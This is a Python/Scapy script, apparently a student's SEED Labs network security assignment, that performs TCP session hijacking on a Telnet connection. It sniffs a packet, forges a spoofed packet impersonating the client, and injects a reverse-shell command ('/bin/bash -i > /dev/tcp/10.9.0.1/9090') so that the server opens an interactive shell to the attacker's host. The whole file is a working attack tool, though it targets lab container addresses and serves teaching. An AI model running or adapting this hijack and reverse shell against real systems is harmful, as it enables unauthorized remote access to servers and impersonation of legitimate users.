#!/usr/bin/env python3
"""
Task 3 — TCP Session Hijacking
Author: Naga Jyothi Mahankali
Course: Network Security — SEED Labs

How it works:
  A Telnet session already exists between User1 (client) and Victim (server).
  The attacker:
    1. Sniffs one packet from the session to learn the current seq/ack numbers.
    2. Injects a forged TCP packet that *impersonates* the client (User1),
       sending an arbitrary command to the victim server as if User1 typed it.
  Because TCP only validates IP/port/seq fields (no authentication), the
  victim executes the injected command.

  The legitimate User1 terminal will be desynchronised afterward.

Usage (run as root on attacker container):
  python3 session_hijack.py
"""

from scapy.all import *

# ── Configuration ──────────────────────────────────────────────────────────────
VICTIM_IP   = "10.9.0.5"   # Telnet server
USER1_IP    = "10.9.0.6"   # Telnet client (victim of hijack)
TELNET_PORT = 23
INTERFACE   = "br-"        # Change to the correct bridge interface name

# Command to inject — this will be executed on the Victim server
# The trailing \n simulates pressing Enter
INJECTED_CMD = b"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
# ───────────────────────────────────────────────────────────────────────────────

hijacked = False   # Inject only once

def hijack(pkt):
    global hijacked
    if hijacked:
        return

    if not (pkt.haslayer(TCP) and pkt.haslayer(IP) and pkt.haslayer(Raw)):
        return

    ip  = pkt[IP]
    tcp = pkt[TCP]

    # Only consider packets sent FROM the client TO the server
    if ip.src != USER1_IP or ip.dst != VICTIM_IP:
        return
    if tcp.dport != TELNET_PORT:
        return

    print(f"[*] Captured session packet:")
    print(f"    {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport}")
    print(f"    seq={tcp.seq}  ack={tcp.ack}")

    # Build forged packet:
    #   src  = User1 (impersonate the client)
    #   dst  = Victim server
    #   seq  = current ACK of sniffed packet  (server expects this next)
    #   ack  = current seq + payload length
    new_seq = tcp.ack
    new_ack = tcp.seq + len(tcp.payload)

    forged_ip  = IP(src=USER1_IP,  dst=VICTIM_IP)
    forged_tcp = TCP(sport=tcp.sport, dport=TELNET_PORT,
                     flags="PA",        # PSH + ACK
                     seq=new_seq,
                     ack=new_ack)
    forged_pkt = forged_ip / forged_tcp / INJECTED_CMD

    send(forged_pkt, verbose=0)
    print(f"[!] Injected command: {INJECTED_CMD.decode().strip()}")
    hijacked = True


bpf_filter = (f"tcp and src host {USER1_IP} and dst host {VICTIM_IP} "
              f"and dst port {TELNET_PORT}")

print(f"[*] Waiting for a live packet in the Telnet session...")
print(f"[*] Filter: {bpf_filter}\n")

sniff(iface=INTERFACE, filter=bpf_filter, prn=hijack)
